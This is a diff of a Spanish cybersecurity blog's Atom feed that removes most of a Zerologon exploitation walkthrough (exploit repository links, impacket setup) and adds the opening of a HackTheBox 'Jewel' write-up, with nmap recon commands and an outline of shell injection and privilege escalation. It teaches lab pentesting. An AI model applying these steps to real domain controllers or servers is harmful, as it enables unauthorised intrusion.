@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-27T13:45:27+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">jflabur.io</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><entry><title type="html">Cómo configurar un buen entorno de trabajo en Linux</title><link href="http://localhost:4000/como-configurar-un-buen-entorno-de-trabajo-en-linux/" rel="alternate" type="text/html" title="Cómo configurar un buen entorno de trabajo en Linux" /><published>2020-09-26T01:00:00+02:00</published><updated>2020-09-26T01:00:00+02:00</updated><id>http://localhost:4000/como-configurar-un-buen-entorno-de-trabajo-en-linux</id><content type="html" xml:base="http://localhost:4000/como-configurar-un-buen-entorno-de-trabajo-en-linux/">&lt;p&gt;Muy buenas a todos soy jflabur y en esta ocasión os traigo un artículo un poco diferente, por lo menos en  cuanto a temática, no vamos a estar tocando open testing no todo es romper…&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-11-24T17:32:14+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">jflabur.io</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><entry><title type="html">Cómo configurar un buen entorno de trabajo en Linux</title><link href="http://localhost:4000/como-configurar-un-buen-entorno-de-trabajo-en-linux/" rel="alternate" type="text/html" title="Cómo configurar un buen entorno de trabajo en Linux" /><published>2020-09-26T01:00:00+02:00</published><updated>2020-09-26T01:00:00+02:00</updated><id>http://localhost:4000/como-configurar-un-buen-entorno-de-trabajo-en-linux</id><content type="html" xml:base="http://localhost:4000/como-configurar-un-buen-entorno-de-trabajo-en-linux/">&lt;p&gt;Muy buenas a todos soy jflabur y en esta ocasión os traigo un artículo un poco diferente, por lo menos en  cuanto a temática, no vamos a estar tocando open testing no todo es romper…&lt;/p&gt;
 
 &lt;p&gt;Cómo hago para que mi entorno de escritorio se vea tal y como se ve es decir yo no tengo escritorio todo  está vacío, yo no puedo hacer clic derecho ni puedo crear una carpeta desde directamente no puedo hacer clic derecho y darle a crear nueva carpeta todo lo tengo que hacer por consola yo lo que utilizo es Bspwm que es un gestor de ventanas más personalizabley mucho más avanzado que ib3 gaps sobre todo por el nivel de personalización.&lt;/p&gt;
 
@@ -205,111 +205,231 @@ mucho más a fondo, y todo esto se personaliza a mano o sea que tiene su trabajo
 &lt;h2 id=&quot;lanzar-proceso-con-sxhkd-bajo-un-contexto-privilegiado&quot;&gt;Lanzar proceso con sxhkd bajo un contexto privilegiado&lt;/h2&gt;
 &lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;
 
-&lt;p&gt;¡Un saludo y que os sea leve!&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Certificaciones" /><category term="OSCP" /><category term="Offensive Security" /><category term="Pentesting" /><category term="Examen" /><category term="Guías" /><summary type="html">Para aquellos interesados en certificarse de OSCP, por aquí os dejo una guía hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinación.</summary></entry><entry><title type="html">Cómo explotar la vulnerabilidad Zerologon</title><link href="http://localhost:4000/como-explotar-vulnerabilidad-zerologon/" rel="alternate" type="text/html" title="Cómo explotar la vulnerabilidad Zerologon" /><published>2020-09-16T00:00:00+02:00</published><updated>2020-09-16T00:00:00+02:00</updated><id>http://localhost:4000/como-explotar-vulnerabilidad-zerologon</id><content type="html" xml:base="http://localhost:4000/como-explotar-vulnerabilidad-zerologon/">&lt;p&gt;&lt;img src=&quot;/assets/images/zerologon/zerologon.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;¡Un saludo y que os sea leve!&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Certificaciones" /><category term="OSCP" /><category term="Offensive Security" /><category term="Pentesting" /><category term="Examen" /><category term="Guías" /><summary type="html">Para aquellos interesados en certificarse de OSCP, por aquí os dejo una guía hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinación.</summary></entry><entry><title type="html">HackTheBox Jewel</title><link href="http://localhost:4000/hackthebox-jewel/" rel="alternate" type="text/html" title="HackTheBox Jewel" /><published>2020-09-16T00:00:00+02:00</published><updated>2020-09-16T00:00:00+02:00</updated><id>http://localhost:4000/hackthebox-jewel</id><content type="html" xml:base="http://localhost:4000/hackthebox-jewel/">&lt;div style=&quot;float: left; margin-left: 45px; margin-right: 35px;margin-top: 35px;&quot;&gt;
+	&lt;table&gt;
+                                &lt;thead&gt;
+                                   &lt;tr&gt;
+                                        &lt;th&gt;Column  &lt;/th&gt;&lt;th&gt;
+                                            Detalles
+                                &lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;
+                                    &lt;tr&gt;
+                                        &lt;td&gt;Name
+                                        &lt;/td&gt;&lt;td&gt;
+                                            Jewel
+                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+                                        &lt;td&gt;IP
+                                        &lt;/td&gt;&lt;td&gt;
+                                            10.10.10.211
+                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+                                        &lt;td&gt;Points
+                                        &lt;/td&gt;&lt;td&gt;
+                                            30
+                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+                                        &lt;td&gt;Os
+                                        &lt;/td&gt;&lt;td&gt;
+                                            Linux
+                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+                                        &lt;td&gt;Medium
+                                        &lt;/td&gt;&lt;td&gt;
+                                            Hard
+                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+                                        &lt;td&gt;Creator
+                                        &lt;/td&gt;&lt;td&gt;
+                                            &lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/159204&quot; target=&quot;_blank&quot;&gt;polarbearer&lt;/a&gt;
+                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+                                        &lt;td&gt;Out On
+                                        &lt;/td&gt;&lt;td&gt;10 Oct 2020
+                            &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
+&lt;/table&gt;
+	&lt;/div&gt;
 
-&lt;h2 id=&quot;es-realmente-crítico-zerologon&quot;&gt;¿Es realmente crítico Zerologon?&lt;/h2&gt;
+&lt;div&gt;
+	&lt;p align=&quot;left&quot;&gt;
+&lt;img src=&quot;/assets/images/jewel/jewel.png&quot; /&gt;
+&lt;/p&gt;
+&lt;/div&gt;
 
-&lt;p&gt;La respuesta es un &lt;strong&gt;si&lt;/strong&gt; rotundo. No creo que haga falta a estas alturas comentar qué es Zerologon… ya existen montón de artículos a disposición detallando de forma técnica y ejecutiva en qué consiste la vulnerabilidad.&lt;/p&gt;
-
-&lt;p&gt;Centrémonos en la explotación, ¿cómo se explota zerologon?, vamos a ello. En mi caso comenzaré haciendo uso de la siguiente utilidad:&lt;/p&gt;
+&lt;h1 id=&quot;resumen&quot;&gt;Resumen&lt;/h1&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/SecuraBV/CVE-2020-1472&quot;&gt;https://github.com/SecuraBV/CVE-2020-1472&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#nmap-muestra-los-3-puertos-abiertos&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; muestra los 3 puertos abiertos.&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#conseguir-el-web-server&quot;&gt;Conseguir el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web server&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#inyecctando-la-shell-en-el-servidor&quot;&gt;Inyecctando la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt; en el servidor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#conseguir-la-shell-desde-el-servidor&quot;&gt;Conseguir la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt; desde el servidor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#conseguir-el-password-de-la-cuenta-de-bill-en-los-backups-del-servidor&quot;&gt;Conseguir el password de la cuenta de bill en los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backups del servidor&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#obtener-el-codigo-de-google-authenticator&quot;&gt;Obtener el codigo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Google Authenticator&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#usando-el-comando-sudo--l&quot;&gt;Usando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#con-la-ayuda-de-gtfo-bins-obtenemos-el-roottxt&quot;&gt;Con la ayuda de GTFO bins obtenemos el root.txt&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;Este recurso, nos permitirá a través del script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zerologon_tester.py&lt;/code&gt;, saber si el DC en cuestión es vulnerable ante el ataque. Yo ya dispongo de un DC virtualizado contra el que lanzar el tester, en caso de no contar con uno, te recomiendo hacer uso de la utilidad ‘&lt;strong&gt;AD-AutomationLab&lt;/strong&gt;’, una herramienta en PowerShell que desarrollé para el despliegue automatizado de un Domain Controller entre otras cosas (también es capaz de configurar vulnerabilidades reconocidas sobre el servidor).&lt;/p&gt;
-
-&lt;p&gt;Por aquí os dejo el enlace para aquellos/as que lo quieran usar:&lt;/p&gt;
+&lt;h2 id=&quot;nmap-muestra-los-3-puertos-abiertos&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; muestra los 3 puertos abiertos.&lt;/h2&gt;
+&lt;p&gt;Primero añadinos a nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; la máquina Jewel.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.211  jewel.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Cada uno tiene su forma de hacer la enumeración de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/AD-AutomationLab&quot;&gt;https://github.com/s4vitar/AD-AutomationLab&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;scaneo inicial de puertos abiertos sobre el sistema&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&quot;cómo-se-explota-la-vulnerabilidad-zerologon&quot;&gt;¿Cómo se explota la vulnerabilidad Zerologon?&lt;/h2&gt;
-
-&lt;p&gt;Una vez tengamos ya el Domain Controller operando, podremos empezar. La dirección IP de mi DC en este caso es la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.101.130&lt;/code&gt;, y la dirección IP de mi equipo atacante la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.101.128&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Partiendo de este punto, estos son los resultados obtenidos al lanzar el tester sobre el DC:&lt;/p&gt;
-
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-nmap&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.211
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/zerologon/1.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/jewel/nmap1.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;Toda la información referente al nombre de equipo, dominio y demás puede obtenerse rápidamente desde CrackMapExec con un simple escaneo por Samba:&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/zerologon/2.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;En base a los resultados de la primera foto, vemos que el DC es vulnerable. Lo único que nos queda por tanto es explotar la vulnerabilidad.&lt;/p&gt;
-
-&lt;p&gt;En esta ocasión, estaré usando el siguiente recurso de la plataforma de GitHub:&lt;/p&gt;
-
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/dirkjanm/CVE-2020-1472&quot;&gt;https://github.com/dirkjanm/CVE-2020-1472&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Enumeración del servicio y versionado para los puertos descubiertos sobre el sistema&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;Esta utilidad cuenta con un script de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cve-2020-1472-exploit.py&lt;/code&gt;, el cual como información nos solicita el nombre del equipo y la dirección IP de la máquina víctima.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;allPorts | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{2,5}/open'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt; | xargs | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;La razón de hacer esto es que me parece mucho más ágil el poder tener una visual de los puertos abiertos de un primer tirón para el escaneo inicial, así en lo que posteriormente lanzo el profundo de enumeración de servicios con los scripts básicos de enumeración, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).&lt;/p&gt;
 
-&lt;p&gt;Antes de explotar la vulnerabilidad, para evitar problemas con Impacket, recomiendo tirar de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtualenv&lt;/code&gt; para tras su instalación ejecutar posteriormente la herramienta. Sería seguir básicamente los siguientes pasos:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop]
-└──╼ &lt;span class=&quot;c&quot;&gt;#virtualenv zerologon&lt;/span&gt;
-created virtual environment CPython3.8.2.final.0-64 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;178ms
-  creator CPython3Posix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/s4vitar/Desktop/zerologon, &lt;span class=&quot;nv&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;False, &lt;span class=&quot;nv&quot;&gt;global&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-  seeder FromAppData&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;download&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;False, &lt;span class=&quot;nv&quot;&gt;CacheControl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;appdirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;certifi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;chardet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;colorama&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;contextlib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;distlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;distro&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;html5lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;idna&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;ipaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;lockfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;msgpack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;packaging&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;pep517&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;pip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;pkg_resources&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;pyparsing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;pytoml&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;retrying&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;setuptools&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;six&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;webencodings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;wheel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;latest, &lt;span class=&quot;nv&quot;&gt;via&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;copy, &lt;span class=&quot;nv&quot;&gt;app_data_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/root/.local/share/virtualenv/seed-app-data/v1.0.1.debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
-┌─[root@parrot]─[/home/s4vitar/Desktop]
-└──╼ &lt;span class=&quot;c&quot;&gt;#source zerologon/bin/activate&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;zerologon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ┌─[root@parrot]─[/home/s4vitar/Desktop]
-└──╼ &lt;span class=&quot;c&quot;&gt;#cd /opt/&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;zerologon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ┌─[root@parrot]─[/opt]
-└──╼ &lt;span class=&quot;c&quot;&gt;#git clone https://github.com/SecureAuthCorp/impacket&lt;/span&gt;
-Clonando en &lt;span class=&quot;s1&quot;&gt;'impacket'&lt;/span&gt;...
-remote: Enumerating objects: 39, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;39/39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;26/26&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 18517 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 19&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 26 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 13&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 18478
-Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;18517/18517&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 6.17 MiB | 5.96 MiB/s, listo.
-Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14103/14103&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;zerologon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ┌─[root@parrot]─[/opt]
-└──╼ &lt;span class=&quot;c&quot;&gt;#cd impacket/&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;zerologon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ┌─[root@parrot]─[/opt/impacket]
-└──╼ &lt;span class=&quot;c&quot;&gt;#python3 setup.py install&lt;/span&gt;
-
-...
-
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; misc
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Una vez hecho, la ejecución del exploit debe devolver un output como este en caso de éxito:&lt;/p&gt;
+&lt;p&gt;Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de búsqueda a fin de determinar los puertos que están abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciéndolo incompleto):&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/zerologon/3.png&quot; /&gt;
-&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p1-10000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ipHost &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; range1-10000
+nmap &lt;span class=&quot;nt&quot;&gt;-p10000-20000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ipHost &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; range10000-20000
+nmap &lt;span class=&quot;nt&quot;&gt;-p20000-30000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ipHost &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; range20000-30000
+                        &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+                        &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+                        &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Si esto es así, ya todo lo demás está hecho. Lo único que tendríamos que hacer, tal y como nos indica el README del siguiente recurso:&lt;/p&gt;
+&lt;p&gt;En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script http-enum.nse de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeño pero nos puede servir para tener una visual rápida sobre los recursos alojados):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-enum.nse &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,443,8080 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; webScan
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/risksense/zerologon&quot;&gt;https://github.com/risksense/zerologon&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Visualización de categorías para los scripts de nmap&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;Sería ejecutar la siguiente sentencia:&lt;/p&gt;
-
